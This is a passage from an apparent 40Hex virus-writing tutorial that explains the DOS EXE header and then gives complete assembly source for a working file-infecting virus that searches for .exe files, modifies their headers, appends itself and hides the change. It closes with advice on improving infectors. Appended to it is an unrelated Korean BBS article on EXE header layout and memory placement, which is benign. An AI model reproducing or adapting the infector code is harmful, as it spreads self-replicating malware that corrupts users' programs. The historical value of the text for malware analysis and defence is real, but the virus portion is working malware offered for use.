  appropriately.   Therefore, EXE  infections do  not require  restoration of
  bytes of  code, but  rather involve  the manipulation  of the  header which
  appears in  the beginning every EXE file and the appending of viral code to
  the infected file.  The format of the header follows:

   Offset Description
     00   ID word, either 'MZ' or 'ZM'
     02   Number of bytes in the last (512 byte) page in the image
     04   Total number of 512 byte pages in the file
     06   Number of entries in the segment table
     08   Size of the header in (16 byte) paragraphs
     0A   Minimum memory required in paragraphs
     0C   Maximum memory requested in paragraphs
     0E   Initial offset in paragraphs to stack segment from header
     10   Initial offset in bytes of stack pointer from stack segment
     12   Negative checksum (ignored)
     14   Initial offset in bytes of instruction pointer from code segment
     16   Initial offset in paragraphs of code segment from header
     18   Offset of relocation table from start of file
     1A   Overlay number (ignored)

  The ID  word is  generally 'ZM'  (in the  Intel little-endian format).  Few
  files start  with the  alternate form,  'MZ' (once  again in  Intel little-
  endian format).   To  save space, a check for the alternate form of the EXE
  ID in  the virus  may be omitted, although a few files may be corrupted due
  to this omission.

  The words  at offsets  2 and  4 are related.  The word at offset 4 contains
  the filesize  in pages.   A  page is  a 512 byte chunk of memory, just as a
  word is  a two  byte chunk of memory.  This number is rounded up, so a file
  of length  514 bytes  would contain a 2 at offset 4 in the EXE header.  The
  word at offset 2 is the image length modulo 512.  The image length does not
  include the  header length.   This  is one of the bizarre quirks of the EXE
  header.   Since the header length is usually a multiple of 512 anyway, this
  quirk usually  does not  matter.  If the word at offset 2 is equal to four,
  then it  is generally  ignored (heck,  it's never really used anyway) since
  pre-1.10 versions  of the  Microsoft linker had a bug which caused the word
  to always  be equal  to four.  If you are bold, the virus can set this word
  to 4.   However, keep in mind that this was a bug of the linker and not all
  command interpreters may recognise this quirk.

  The minimum memory required by the program (offset A) can be ignored by the
  virus, as  the maximum  memory is generally allocated to the program by the
  operating system.   However,  once again,  ignoring this area of the header
  MAY cause  an unsucessful  infection.   Simply adding  the  virus  size  in
  paragraphs to this value can nullify the problem.

  The words  representing the  initial stack segment and pointer are reversed
  (not in  little-endian format).   In  other words,  an LES to this location
  will yield  the stack  pointer in  ES and  the  stack  segment  in  another
  register.   The initial  SS:SP is  calculated  with  the  base  address  of
  0000:0000 being at the end of the header.

  Similarly, the  initial CS:IP  (in little-endian format) is calculated with
  the base  address of  0000:0000 at  the end of the header.  For example, if
  the program  entry point  appears directly after the header, then the CS:IP
  would be 0000:0000.  When the program is loaded, the PSP+10 is added to the
  segment value (the extra 10 accounts for the 100h bytes of the PSP).

  All the  relevant portions  of the  EXE header  have been covered.  So what
  should be  done to  write a  nonoverwriting EXE infector?  First, the virus
  must be appended to the end of the file.  Second, the initial CS:IP must be
  saved and  subsequently changed  in the  header.   Third, the initial SS:SP
  should also  be saved  and changed.   This  is to avoid any possible memory
  conflicts from  the stack  overwriting viral  code.   Fourth, the file size
  area of  the header should be modified to correctly reflect the new size of
  the file.   Fifth,  any additional  safety modifications such as increasing
  the minimum  memory allocation  should be made.  Last, the header should be
  written to the infected file.

  There are  several good areas for ID bytes in the EXE header.  The first is
  in the stack pointer field.  Since it should be changed anyway, changing it
  to a  predictable number  would add nothing to the code length.  Make sure,
  however, to  make the stack pointer high enough to prevent code overwrites.
  Another common  area for ID bytes is in the negative checksum field.  Since
  it is  an unused  field, altering  it won't  affect the  execution  of  any
  programs.

  One further item should be mentioned before the code for the EXE infector.
  It is important to remember that EXE files are loaded differently than COM
  files.  Although a PSP is still built, the initial CS does NOT point to it.
  Instead, it points to wherever the entry point happens to be.  DS and ES
  point to the PSP, and therefore do NOT point to the entry point (your virus
  code).  It is important to restore DS and ES to their proper values before
  returning control to the EXE.

  ----cut here---------------------------------------------------------------

  .model tiny                             ; Handy TASM directive
  .code                                   ; Virus code segment
            org 100h                      ; COM file starting IP
  ; Cheesy EXE infector
  ; Written by Dark Angel of PHALCON/SKISM
  ; For 40Hex Number 8 Volume 2 Issue 4
  id = 'DA'                               ; ID word for EXE infections

  startvirus:                             ; virus code starts here
            call next                     ; calculate delta offset
  next:     pop  bp                       ; bp = IP next
            sub  bp,offset next           ; bp = delta offset

            push ds
            push es
            push cs                       ; DS = CS
            pop  ds
            push cs                       ; ES = CS
            pop  es
            lea  si,[bp+jmpsave2]
            lea  di,[bp+jmpsave]
            movsw
            movsw
            movsw
            movsw

            mov  ah,1Ah                   ; Set new DTA
            lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
            int  21h

            lea  dx,[bp+exe_mask]
            mov  ah,4eh                   ; find first file
            mov  cx,7                     ; any attribute
  findfirstnext:
            int  21h                      ; DS:DX points to mask
            jc   done_infections          ; No mo files found

            mov  al,0h                    ; Open read only
            call open

            mov  ah,3fh                   ; Read file to buffer
            lea  dx,[bp+buffer]           ; @ DS:DX
            mov  cx,1Ah                   ; 1Ah bytes
            int  21h

            mov  ah,3eh                   ; Close file
            int  21h

  checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
            jnz  infect_exe
  find_next:
            mov  ah,4fh                   ; find next file
            jmp  short findfirstnext
  done_infections:
            mov  ah,1ah                   ; restore DTA to default
            mov  dx,80h                   ; DTA in PSP
            pop  es
            pop  ds                       ; DS->PSP
            int  21h
            mov  ax,es                    ; AX = PSP segment
            add  ax,10h                   ; Adjust for PSP
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ; Clear intrpts for stack manip.
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                     ; jmp ssss:oooo
  jmpsave             dd ?                ; Original CS:IP
  stacksave           dd ?                ; Original SS:SP
  jmpsave2            dd 0fff00000h       ; Needed for carrier file
  stacksave2          dd ?

  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
  virusname           db '[DemoEXE] for 40Hex',0

  infect_exe:
            les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
            mov  word ptr [bp+jmpsave2], ax
            mov  word ptr [bp+jmpsave2+2], es

            les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
            mov  word ptr [bp+stacksave2], es
            mov  word ptr [bp+stacksave2+2], ax

            mov  ax, word ptr [bp+buffer + 8] ; Get header size
            mov  cl, 4                        ; convert to bytes
            shl  ax, cl
            xchg ax, bx

            les  ax, [bp+offset newDTA+26]; Get file size
            mov  dx, es                   ; to DX:AX
            push ax
            push dx

            sub  ax, bx                   ; Subtract header size from
            sbb  dx, 0                    ; file size

            mov  cx, 10h                  ; Convert to segment:offset
            div  cx                       ; form

            mov  word ptr [bp+buffer+14h], dx ; New entry point
            mov  word ptr [bp+buffer+16h], ax

            mov  word ptr [bp+buffer+0Eh], ax ; and stack
            mov  word ptr [bp+buffer+10h], id

            pop  dx                       ; get file length
            pop  ax

            add  ax, heap-startvirus      ; add virus size
            adc  dx, 0

            mov  cl, 9                    ; 2**9 = 512
            push ax
            shr  ax, cl
            ror  dx, cl
            stc
            adc  dx, ax                   ; filesize in pages
            pop  ax
            and  ah, 1                    ; mod 512

            mov  word ptr [bp+buffer+4], dx ; new file size
            mov  word ptr [bp+buffer+2], ax

            push cs                       ; restore ES
            pop  es

            mov  cx, 1ah
  finishinfection:
            push cx                       ; Save # bytes to write
            xor  cx,cx                    ; Clear attributes
            call attributes               ; Set file attributes

            mov  al,2
            call open

            mov  ah,40h                   ; Write to file
            lea  dx,[bp+buffer]           ; Write from buffer
            pop  cx                       ; cx bytes
            int  21h

            mov  ax,4202h                 ; Move file pointer
            xor  cx,cx                    ; to end of file
            cwd                           ; xor dx,dx
            int  21h

            mov  ah,40h                   ; Concatenate virus
            lea  dx,[bp+startvirus]
            mov  cx,heap-startvirus       ; # bytes to write
            int  21h

            mov  ax,5701h                 ; Restore creation date/time
            mov  cx,word ptr [bp+newDTA+16h] ; time
            mov  dx,word ptr [bp+newDTA+18h] ; date
            int  21h

            mov  ah,3eh                   ; Close file
            int  21h

            mov ch,0
            mov cl,byte ptr [bp+newDTA+15h] ; Restore original
            call attributes                 ; attributes

  mo_infections: jmp find_next

  open:
            mov  ah,3dh
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            xchg ax,bx
            ret

  attributes:
            mov  ax,4301h                 ; Set attributes to cx
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            ret

  exe_mask            db '*.exe',0
  heap:                                   ; Variables not in code
  newDTA              db 42 dup (?)       ; Temporary DTA
  buffer              db 1ah dup (?)      ; read buffer
  endheap:                                ; End of virus

  end       startvirus

  ----cut here---------------------------------------------------------------

  This is a simple EXE infector.  It has limitations; for example, it does
  not handle misnamed COM files.  This can be remedied by a simple check:

    cmp [bp+buffer],'ZM'
    jnz misnamed_COM
  continueEXE:

  Take special notice of the done_infections and infect_exe procedures.  They
  handle all  the relevant portions of the EXE infection.  The restoration of
  the EXE  file simply  consists of  resetting the stack and a far jmp to the
  original entry point.

  A final  note on  EXE infections: it is often helpful to "pad" EXE files to
  the nearest  segment.  This accomplishes two things.  First, the initial IP
  is  always  0,  a  fact  which  can  be  used  to  eliminate  delta  offset
  calculations.   Code space  can be  saved by  replacing all  those annoying
  relative memory  addressing statements  ([bp+offset blip])  statements with
  their absolute  counterparts (blip).   Second, recalculation of header info
  can be  handled in  paragraphs, simplifying  it tremendously.  The code for
  this is left as an exercise for the reader.

  This file is dedicated to the [XxXX] (Censored. -Ed.) programmers (who have
  yet to figure out how to  write EXE  infectors).  Hopefully, this  text can
  teach them (and everyone else) how to progress beyond simple COM and spawn-
  ing EXE infectors.   In the next issue of 40Hex,  I will present the theory
  and code for the next step of file infector - the coveted SYS file.



  아래는 하이텔에서 가져온 EXE 파일에 대한 정보이다.

#26   프전동   (k2prg   )
exe, 'EXE 파일 구조' 및 메모리 배치

제    목: EXE 파일 구조 및 메모리 배치

작 성 자: 안치봉   (iq500   )


'EXE 파일'의 구조와  메모리에 배치되는 방법등을 알아보자.  'EXE 파일'은 '헤더
+ 실제코드'로 구성되어 있다.  헤더에는 실행파일을 실행할때 필요한 각종 정보가
들어 있다. 다음은 'EXE 파일'의 헤더구조이다.


옵셋      내용
-------   ---------------
00         MZ(EXE 화일임을 나타낸다)
02         헤더크기를 512 로 나눈 나머지
04         헤더크기를 512 로 나눈 몫(나머지가 있으면 1 을 더한다)
06         재배치관련
08         패러그래프(16바이트)단위 의 헤더 크기
0A         메모리관련..
0C         메모리관련..
0E         패러그래프단위의 스택의 위치
10         스택의 주소
12         체크섬
14         IP 의 주소
16         패러그래프 단위의 CS 의 위치
1A         오버레이
..         나머진 재배치와 관련(Fixup Table).....
-------   ---------------

'EXE 화일'에서 처음 실행될 'CS:IP'의 위치를 찾는 방법은 아주 간단하다. 헤더의
정보를 이용해서 -- 참고로 여기서의 CS:IP 의 위치는 실제로 메모리에 배치될때의
위치가 아니라 -- 현재 EXE 화일에서의 위치 라는것이다. 결국 메모리에 배치될 때
에도 IP:CS 는 같지만 약간 틀리기때문인데 디스크 에디터등으로 직접 테스트 해보
기 바란다.  디버거로 'EXE 파일' 아무거나 읽어 들인다음  R 하면 옆에 16 진수로
코드가 나타나는데,  이것과 '디스크 에디터'로 찾아낸 'CS:IP'의 위치를 비교하면
아마 일치함을 알수 있을것이다. -- 스택도 마찬가지


<'EXE 파일'상에서 'CS:IP'의 Entry 위치 구하는법>

Entry = (헤더중16h 번값 * 10H) + (헤더중 08h 번값 * 10H) + 헤더중 14h 번값



이제 부터는 IBM-PC 가 메모리를 어떻게 구성하는지 알아보자.

0E95:0000 CD 20 C8 10 CD 10 CD 12 CD 13 12 56 78 23 45 67
0E95:0010 17 45 4F 35 FF FF FF FF FF FF FF FF FF FF FF FF
0E95:0020 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
- 이하생략 -

만약 메모리가 위와 같이 형성 되어 있다면, 패러그래프 단위로 메모리가 배치되기
때문에 메모리 0E95:0000 이후의 메모리 배치는 바로 아래와 같이 배치된다는걸 알
수 있을것이다.

0E96:0000 17 45 4F 35 FF FF FF FF FF FF FF FF FF FF FF FF
0E96:0010 FF FF FF FF FF FF FF FF FF FF FFFF FF FF FF FF
- 이하생략 -

'EXE 파일'이 메모리에 배치 될때도 예외는 아니다.  우선 사용가능한 하위 메모리
에 PSP를 구축하고 그뒤에 바로 헤더를 뺀, 실제 'EXE 파일'의 나머질 읽어 들인다.

그리고 화일의 크기가 한 세그먼트를 넘으면 계속 패러그래프단위로 메모리를 배치
시키면서 읽어들인다.  ES, DS, PSP는 같은 세그먼트를 가르키게 되는데 그래도 이
해가 안가는 분을 위해서 예제를 들어 보겠다.  아래 예제는 EXE 화일에서 직접 DS
의 위치를 설정한. -- 대개는 컴파일러가 알아서 위치를 계산해주지만.--

ST_     SEGMENT STACK
           DB 10H DUP (?)
ST_        ENDS

DATA       SEGMENT
           MSG DB 'I M HERE!$'
DATA       ENDS

CODE       SEGMENT
           ASSUME CS:CODE,DS:DATA,SS:ST_

START:     MOV            AX,ES   ;
           ADD            AX,10H  ; 여기서 10H 를 더하는 이유는
                                  ; 현재의 ES 는 PSP 가 포함된
                                  ; 것이므로 ..
                                  ; 앞에 PSP 를 뺀 많큼이 실제의
                                  ; 화일의 내용이므로 10H 를 더
                                  ; 하는 것임(PSP의 크기는 100H)

           ADD            AX,1    ; 1 를 더하는 이유는 스택이 10H
                                  ; 이므로 ES + 10H+ 1 의 위치에
                                  ; 문장이 위치(오프셋 0000H)하게
                                  ; 된다
           MOV            DS,AX   ;
           MOV            AH,9    ;
           MOV            DX,0    ;
           INT            21H     ;

           MOV           AH,4CH  ;
           INT            21H     ;

CODE       ENDS
           END            START

메모리상에서 실제 'CS:IP'의 위치를 구하는 방법을 알아보자. 우선, 헤더를 뺀 실
제 내용은 'PSP'를 빼주어야만 하니까 결국 메모리엔 '패러그래프 단위'로  배치되
는 걸아니까 현재의 DS, ES에 10H 만큼 더하면 PSP가 제거된(?) 실제 헤더를 뺀 내
용이 위치하게 된다.

CS = ES + 10H + 헤더 내용중 16h 번값
IP = 헤더 내용중 14h 번값


